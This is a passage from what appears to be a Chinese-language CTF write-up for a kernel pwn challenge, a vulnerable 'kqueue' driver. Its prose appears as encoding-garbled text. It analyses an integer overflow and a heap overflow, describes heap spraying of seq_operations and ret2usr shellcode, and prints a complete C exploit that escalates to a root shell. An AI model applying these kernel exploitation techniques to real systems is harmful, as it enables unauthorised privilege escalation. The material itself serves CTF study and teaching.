exist&quot;</span>);<br><br>    <span class="hljs-comment">/* Check the idx of the kqueue entry */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Get to the kqueue entry memory */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* Check for the existence of the kqueue entry */</span><br>    exists = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-built_in">queue</span>-&gt;max_entries+<span class="hljs-number">1</span>;i++)&#123;<br><br>        <span class="hljs-comment">/* If kqueue entry found , do the necessary */</span><br>        <span class="hljs-keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>            <span class="hljs-keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;<br>                validate(<span class="hljs-built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>                exists = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        kqueue_entry = kqueue_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx==<span class="hljs-number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>        validate(<span class="hljs-built_in">memcpy</span>(<span class="hljs-built_in">queue</span>-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!exists)<br>        <span class="hljs-keyword">return</span> NOT_EXISTS;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>

<h4 id="save-kqueue-entries"><a href="#save-kqueue-entries" class="headerlink" title="save_kqueue_entries"></a>save_kqueue_entries</h4><p>è¿™ä¸ªåŠŸèƒ½ä¸»è¦æ˜¯åˆ†é…ä¸€å—ç°æœ‰ <code>queue-&gt;queue_size</code> å¤§å°çš„ object ç„¶åæŠŠ queue-&gt;data ä¸å…¶æ‰€æœ‰ queue_entries-&gt;data çš„å†…å®¹æ‹·è´åˆ°ä¸Šè¾¹ï¼Œè€Œå…¶æ¯æ¬¡æ‹·è´çš„å­—èŠ‚æ•°ç”¨çš„æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ <code>request.data_size</code> ï¼Œåœ¨è¿™é‡Œå¾ˆæ˜æ˜¾å­˜åœ¨å †æº¢å‡º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br><br>    <span class="hljs-comment">/* Check for out of bounds queue_idx requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if queue is already saved or not */</span><br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br><br>    <span class="hljs-comment">/* Check if number of requested entries exceed the existing entries */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><br>    <span class="hljs-comment">/* Allocate memory for the kqueue to be saved */</span><br>    <span class="hljs-type">char</span> *new_queue = validate((<span class="hljs-type">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Each saved entry can have its own size */</span><br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Copy main&#x27;s queue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* copy all possible kqueue entries */</span><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸ªå…¨å±€æ•°ç»„æ ‡è¯†ä¸€ä¸ª queue æ˜¯å¦ saved äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> isSaved[MAX_QUEUES] = &#123;<span class="hljs-literal">false</span>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="â‘¢-æ¼æ´åˆ©ç”¨"><a href="#â‘¢-æ¼æ´åˆ©ç”¨" class="headerlink" title="â‘¢ æ¼æ´åˆ©ç”¨"></a>â‘¢ æ¼æ´åˆ©ç”¨</h3><h4 id="Step-I-æ•´æ•°æº¢å‡º"><a href="#Step-I-æ•´æ•°æº¢å‡º" class="headerlink" title="Step I.æ•´æ•°æº¢å‡º"></a>Step I.æ•´æ•°æº¢å‡º</h4><p>è€ƒè™‘åˆ°åœ¨ create_queue ä¸­ä½¿ç”¨ <code>request.max_entries + 1</code> æ¥è¿›è¡Œåˆ¤å®šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¼ å…¥ 0xffffffff ä½¿å¾—å…¶åªåˆ†é…ä¸€ä¸ª queue å’Œä¸€ä¸ª data è€Œä¸åˆ†é… queue_entryçš„åŒæ—¶ä½¿å¾— <code>queue-&gt;max_entries = 0xffffffff</code>ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„ queue-&gt;queue_size ä¾¿ä¸º 0x18</p>
<h4 id="Step-II-å †æº¢å‡º-å †å–·å°„è¦†å†™-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"><a href="#Step-II-å †æº¢å‡º-å †å–·å°„è¦†å†™-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ" class="headerlink" title="Step II.å †æº¢å‡º + å †å–·å°„è¦†å†™ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"></a>Step II.å †æº¢å‡º + å †å–·å°„è¦†å†™ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</h4><p>å‰é¢æˆ‘ä»¬è¯´åˆ°åœ¨ save_kqueue_entries() ä¸­å­˜åœ¨ç€å †æº¢å‡ºï¼Œè€Œåœ¨è¯¥å‡½æ•°ä¸­åˆ†é…çš„ object å¤§å°ä¸º queue-&gt;queue_sizeï¼Œå³ 0x18ï¼Œåº”å½“ä» <code>kmalloc-32</code> ä¸­å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥è€ƒè™‘åœ¨è¯¥ slab ä¸­å¯ç”¨çš„ç»“æ„ä½“</p>
<p>ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œ<strong>seq_operations</strong> è¿™ä¸ªç»“æ„ä½“åŒæ ·ä» <code>kmalloc-32</code> ä¸­åˆ†é…ï¼Œå½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ª stat æ–‡ä»¶æ—¶ï¼ˆå¦‚ <code>/proc/self/stat</code> ï¼‰ä¾¿ä¼šåœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ª seq_operations ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/seq_file.h</code> å½“ä¸­ï¼Œåªå®šä¹‰äº†å››ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>	<span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>	<span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ read ä¸€ä¸ª stat æ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨å…¶ proc_ops çš„ <code>proc_read_iter</code> æŒ‡é’ˆï¼Œå…¶é»˜è®¤å€¼ä¸º <code>seq_read_iter()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>fs/seq_file.c</code> ä¸­ï¼Œæ³¨æ„åˆ°æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>	<span class="hljs-comment">//...</span><br>	p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>	<span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>å³å…¶ä¼šè°ƒç”¨ seq_operations ä¸­çš„ start å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ seq_operations-&gt;start åå†è¯»å–å¯¹åº” stat æ–‡ä»¶ä¾¿èƒ½æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä¿è¯ä¸€å®šèƒ½å¤Ÿæº¢å‡ºåˆ°ä¸€ä¸ª <code>seq_operations</code> å‘¢ï¼Ÿè™½ç„¶è¯´å¯¹äºå¼€å¯äº† random freelist ä¿æŠ¤ï¼ˆé»˜è®¤å¼€å¯ï¼‰çš„ kernel è€Œè¨€æˆ‘ä»¬æ— æ³•ç›´æ¥å¾—çŸ¥åˆ†é…çš„ object å¯¹åº”çš„å†…å­˜å¸ƒå±€ï¼ˆ<del>glibcè¿™ä¸€ç‚¹å°±åšå¾—å¾ˆå¥½ï¼Œå¹³æ•´çš„å†…å­˜å¸ƒå±€å¯ä»¥è®©ğŸ‘´ç›´æ¥çŸ¥é“ Pwn é¢˜é‡Œåˆ†é…çš„æ¯ä¸€ä¸ª chunk çš„ä½ç½®</del>ï¼‰ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>å †å–·å°„</strong>çš„æ‰‹æ³•åœ¨å†…æ ¸ç©ºé—´å–·å°„è¶³å¤Ÿå¤šçš„ seq_operations ç»“æ„ä½“å¸ƒæ»¡ vulnerable object æ‰€åœ¨çš„å†…å­˜é™„è¿‘åŒºåŸŸï¼Œä»è€Œä¿è¯æˆ‘ä»¬èƒ½å¤Ÿæº¢å‡ºåˆ°å…¶ä¸­ä¹‹ä¸€</p>
<h4 id="Step-III-ret2usr-ret2shellcode"><a href="#Step-III-ret2usr-ret2shellcode" class="headerlink" title="Step III.ret2usr + ret2shellcode"></a>Step III.ret2usr + ret2shellcode</h4><p>ç”±äºæ²¡æœ‰å¼€å¯ smepã€smapã€kptiï¼Œæ•… ret2usr çš„æ”»å‡»æ‰‹æ³•åœ¨æœ¬é¢˜ä¸­æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯ç”±äºå¼€å¯äº† kaslr çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“ prepare_kernel_cred å’Œ commit_creds çš„åœ°å€ï¼Œä¼¼ä¹æ— æ³•ç›´æ¥æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(NULL))</code> </p>
<p>è¿™é‡Œ ScuPax0s å¸ˆå‚…ç»™å‡ºäº†ä¸€ä¸ªç¾å¦™çš„è§£æ³•ï¼šé€šè¿‡ç¼–å†™ <strong>shellcode</strong> åœ¨å†…æ ¸æ ˆä¸Šæ‰¾æ°å½“çš„æ•°æ®ä»¥è·å¾—å†…æ ¸åŸºå€ï¼Œæ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(NULL))</code> å¹¶è¿”å›åˆ°ç”¨æˆ·æ€</p>
<h3 id="â‘¢-Final-Exploit"><a href="#â‘¢-Final-Exploit" class="headerlink" title="â‘¢ Final Exploit"></a>â‘¢ Final Exploit</h3><p>æ•…æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint32_t</span>    max_entries;<br>    <span class="hljs-type">uint16_t</span>    data_size;<br>    <span class="hljs-type">uint16_t</span>    entry_idx;<br>    <span class="hljs-type">uint16_t</span>    queue_idx;<br>    <span class="hljs-type">char</span>*       data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">size_t</span> root_rip;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDEADC0DE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx  = queue_idx,<br>        .entry_idx  = entry_idx,<br>        .data       = data,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDAADEEEE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xBADDCAFE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries,<span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx      = queue_idx,<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xB105BABE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span>**envp)</span><br>&#123;<br>    <span class="hljs-type">long</span>        seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span>      *page;<br>    <span class="hljs-type">size_t</span>      data[<span class="hljs-number">0x20</span>];<br><br>    saveStatus();<br>    root_rip = (<span class="hljs-type">size_t</span>) getRootShell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to open the dev!&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)<br>        data[i] = (<span class="hljs-type">size_t</span>) shellcode;<br><br>    createQueue(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span> * <span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, data);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        read(seq_fd[i], data, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ææƒåˆ° root</p>
<p><img src="https://i.loli.net/2021/11/02/oE6vb9nhT1rDwO7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
